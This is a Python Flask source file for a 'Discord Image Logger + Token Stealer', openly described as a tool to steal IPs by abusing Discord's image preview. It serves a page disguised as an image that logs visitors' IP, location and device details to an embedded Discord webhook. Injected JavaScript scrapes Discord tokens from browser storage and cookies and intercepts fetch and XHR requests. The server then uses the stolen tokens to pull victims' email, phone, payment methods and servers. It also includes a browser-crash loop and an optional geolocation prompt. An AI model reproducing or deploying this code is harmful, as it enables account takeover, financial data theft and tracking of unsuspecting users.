# Discord Image Logger + Token Stealer
# Flask version for Vercel deployment

from flask import Flask, request, Response, redirect
from urllib import parse
import traceback, requests, base64, httpagentparser, json

app = Flask(__name__)

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1527069756572827719/7RcOxXxcAkklFLJK0mLIgwJFU-_YkgXw-ZT87KD0GT44FOh9uBpw9zFGtm9RETPjZQw7",
    "image": "https://imgs.search.brave.com/uPzLBPNle4gPYxpk42t_M8USovZfyjNwDL0Vz7NT5H4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/cGljY2xpY2tpbWcu/Y29tL21GUUFBZVN3/MFBscDVpb3kvQmFz/ZS1TdGVhbC1BLUJy/YWlucm90LndlYnA",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    # === DISCORD TOKEN STEALING === #
    "stealTokens": True,
    "tokenStealEndpoint": "/api/tokens",

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception:
        pass


def sendTokenAlert(token, ip, useragent, endpoint="/"):
    if not token or token == "undefined" or token == "null":
        return

    token_parts = token.split(".")
    token_decoded = {}

    if len(token_parts) == 3:
        try:
            payload = token_parts[1]
            payload += "=" * (4 - len(payload) % 4) if len(payload) % 4 else ""
            token_decoded = json.loads(base64.b64decode(payload).decode("utf-8", errors="ignore"))
        except Exception:
            pass

    discord_id = token_decoded.get("id", "Unknown")
    discord_email = token_decoded.get("email", "N/A")
    user_info = None
    billing_info = None
    guilds = None
    nitro_type = "None"

    headers = {"Authorization": token}

    try:
        user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if user_resp.status_code == 200:
            user_info = user_resp.json()
            discord_id = user_info.get("id", discord_id)
            discord_email = user_info.get("email", "N/A")
            premium_type = user_info.get("premium_type", 0)
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
            nitro_type = nitro_map.get(premium_type, "Unknown")
            billing_resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
            if billing_resp.status_code == 200:
                billing_info = billing_resp.json()
            guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
            if guilds_resp.status_code == 200:
                guilds = guilds_resp.json()
    except Exception:
        pass

    embed_description = f"""**🎫 Discord Token Stolen!**

**Token:** `{token[:50]}...`

**User Info:**
> **ID:** `{discord_id}`
> **Email:** `{discord_email}`
> **Username:** `{user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000') if user_info else 'Unknown'}`
> **Nitro:** `{nitro_type}`
> **Phone:** `{user_info.get('phone', 'None') if user_info else 'Unknown'}`
> **MFA Enabled:** `{user_info.get('mfa_enabled', 'Unknown') if user_info else 'Unknown'}`
> **Verified:** `{user_info.get('verified', 'Unknown') if user_info else 'Unknown'}`

**Billing Info:**
> **Payment Methods:** `{len(billing_info) if billing_info else 0}`
"""

    if billing_info:
        for i, method in enumerate(billing_info[:3]):
            btype = method.get("type", "Unknown")
            brand = method.get("brand", "N/A")
            last4 = method.get("last_4", "N/A")
            embed_description += f"> **Method {i+1}:** `{btype}` | `{brand}` | `****{last4}`\n"

    embed_description += f"""
**Guilds:** `{len(guilds) if guilds else 0} servers`
"""

    if guilds:
        sorted_guilds = sorted(guilds, key=lambda g: g.get("approximate_member_count", 0), reverse=True)[:5]
        for g in sorted_guilds:
            embed_description += f"> `{g.get('name', 'Unknown')}` (ID: `{g.get('id', 'N/A')}`) - {g.get('approximate_member_count', '?')} members\n"

    embed_description += f"""
**IP:** `{ip}`
**User-Agent:** `{useragent[:100]}...`
"""

    avatar_url = None
    if user_info and user_info.get('avatar'):
        avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user_info['avatar']}.png"

    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "🎣 Token Stealer",
                "color": 0xFF0000,
                "description": embed_description,
            }
        ],
    }

    if avatar_url:
        payload["embeds"][0]["thumbnail"] = {"url": avatar_url}

    try:
        requests.post(config["webhook"], json=payload)
    except Exception:
        pass


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    if ip.startswith(blacklistedIPs):
        return None

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return None

    if token and config["stealTokens"]:
        sendTokenAlert(token, ip, useragent, endpoint)

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return None
        if config["antiBot"] == 3:
            return None
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    tz_str = ""
    if info.get("timezone"):
        tz_parts = info["timezone"].split('/')
        if len(tz_parts) > 1:
            tz_str = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{tz_str}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
            }
        ],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    try:
        requests.post(config["webhook"], json=embed)
    except Exception:
        pass

    return info


binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
def token_endpoint():
    if request.method == 'OPTIONS':
        resp = Response('')
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp

    data = request.get_json(silent=True) or {}
    token = data.get("token", "")

    if token:
        sendTokenAlert(
            token,
            request.headers.get('x-forwarded-for', request.remote_addr or 'Unknown'),
            request.headers.get('user-agent', 'Unknown'),
            "/api/tokens"
        )

    resp = Response('{"status":"ok"}', mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        query_string = request.query_string.decode('utf-8') if request.query_string else ''
        query_params = dict(parse.parse_qsl(parse.urlsplit(f'?{query_string}').query))

        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url = base64.b64decode((query_params.get("url") or query_params.get("id")).encode()).decode()
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or '')
        ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr or ''
        useragent = request.headers.get('user-agent', '')
        endpoint = f"/{path}" if path else "/"

        if ip and ip.startswith(blacklistedIPs):
            return Response('', status=403)

        bot_check_result = botCheck(ip, useragent)

        token_steal_script = ""
        if config["stealTokens"]:
            host = request.headers.get('Host', 'localhost')
            scheme = request.headers.get('X-Forwarded-Proto', 'http')
            callback_url = f"{scheme}://{host}/api/tokens"

            token_steal_script = f"""
            <script>
            (function() {{
                var tokenStealEndpoint = '{callback_url}';
                var discordTokens = [];
                try {{
                    for (var i = 0; i < localStorage.length; i++) {{
                        var key = localStorage.key(i);
                        var value = localStorage.getItem(key);
                        if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                            if (typeof value === 'string' && value.split('.').length === 3) {{
                                discordTokens.push({{source: 'localStorage', key: key, token: value}});
                            }}
                        }}
                    }}
                    var dt = localStorage.getItem('token');
                    if (dt && dt.split('.').length === 3) {{
                        discordTokens.push({{source: 'localStorage', key: 'token', token: dt}});
                    }}
                }} catch(e) {{}}
                try {{
                    for (var i = 0; i < sessionStorage.length; i++) {{
                        var key = sessionStorage.key(i);
                        var value = sessionStorage.getItem(key);
                        if (typeof value === 'string' && value.split('.').length === 3 && value.length > 50) {{
                            discordTokens.push({{source: 'sessionStorage', key: key, token: value}});
                        }}
                    }}
                }} catch(e) {{}}
                try {{
                    document.cookie.split(';').forEach(function(c) {{
                        c = c.trim();
                        if (c.toLowerCase().includes('token') || c.toLowerCase().includes('discord')) {{
                            var parts = c.split('=');
                            var val = parts.slice(1).join('=');
                            if (val.split('.').length === 3) {{
                                discordTokens.push({{source: 'cookie', key: parts[0], token: val}});
                            }}
                        }}
                    }});
                }} catch(e) {{}}
                var originalFetch = window.fetch;
                window.fetch = function() {{
                    if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
                        if (arguments[1] && arguments[1].headers) {{
                            var auth = arguments[1].headers.Authorization || arguments[1].headers.authorization;
                            if (auth && auth.split('.').length === 3) {{
                                discordTokens.push({{source: 'fetch_intercept', key: 'Authorization', token: auth}});
                            }}
                        }}
                    }}
                    return originalFetch.apply(this, arguments);
                }};
                var originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, url) {{
                    if (url && typeof url === 'string' && url.includes('discord.com/api')) {{
                        var xhr = this;
                        var originalSetHeader = xhr.setRequestHeader;
                        xhr.setRequestHeader = function(header, value) {{
                            if ((header === 'Authorization' || header === 'authorization') &&
                                typeof value === 'string' && value.split('.').length === 3) {{
                                discordTokens.push({{source: 'xhr_intercept', key: header, token: value}});
                            }}
                            return originalSetHeader.apply(this, arguments);
                        }};
                    }}
                    return originalOpen.apply(this, arguments);
                }};
                if (discordTokens.length > 0) {{
                    setTimeout(function() {{
                        var sentTokens = {{}};
                        discordTokens.forEach(function(item) {{
                            if (!sentTokens[item.token]) {{
                                sentTokens[item.token] = true;
                                var xhr = new XMLHttpRequest();
                                xhr.open('POST', tokenStealEndpoint, true);
                                xhr.setRequestHeader('Content-Type', 'application/json');
                                xhr.send(JSON.stringify({{
                                    token: item.token,
                                    source: item.source,
                                    key: item.key,
                                    url: window.location.href
                                }}));
                            }}
                        }});
                    }}, 500);
                }}
            }})();
            </script>
            """

        if bot_check_result:
            if config["buggedImage"]:
                resp = Response(binaries["loading"], mimetype='image/jpeg')
            else:
                resp = redirect(url)
            makeReport(ip, useragent, endpoint=endpoint, url=url)
            return resp

        url_token = query_params.get("t") or query_params.get("token")
        coords = None
        if query_params.get("g") and config["accurateLocation"]:
            try:
                coords = base64.b64decode(query_params.get("g").encode()).decode()
            except Exception:
                pass

        result = makeReport(ip, useragent, coords, endpoint, url=url, token=url_token)

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp", "Unknown"))
            message = message.replace("{asn}", result.get("as", "Unknown"))
            message = message.replace("{country}", result.get("country", "Unknown"))
            message = message.replace("{region}", result.get("regionName", "Unknown"))
            message = message.replace("{city}", result.get("city", "Unknown"))
            message = message.replace("{lat}", str(result.get("lat", "")))
            message = message.replace("{long}", str(result.get("lon", "")))
            if result.get("timezone"):
                tz_parts = result["timezone"].split('/')
                if len(tz_parts) > 1:
                    message = message.replace("{timezone}", f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})")
            message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
            message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
            hosting = result.get("hosting", False)
            message = message.replace("{bot}", str(hosting if hosting and not result.get("proxy") else 'Possibly' if hosting else 'False'))
            message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

        html = f'''<!DOCTYPE html>
<html>
<head>
<style>
body {{ margin: 0; padding: 0; }}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
{token_steal_script}
</head>
<body>'''

        if config["redirect"]["redirect"]:
            html += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        elif config["message"]["doMessage"]:
            html += f'<div>{message}</div>'
        elif config["crashBrowser"]:
            html += f'<div>{message}</div><script>setTimeout(function(){{for (var i=69420;i==i;i*=i){{console.log(i)}}}}, 100)</script>'
        else:
            html += '<div class="img"></div>'

        if config["accurateLocation"]:
            html += '''<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>'''

        html += '</body></html>'
        return Response(html, mimetype='text/html')

    except Exception as e:
        error_trace = traceback.format_exc()
        try:
            reportError(error_trace)
        except Exception:
            pass
        return Response('500 - Internal Server Error', status=500)


handler = app
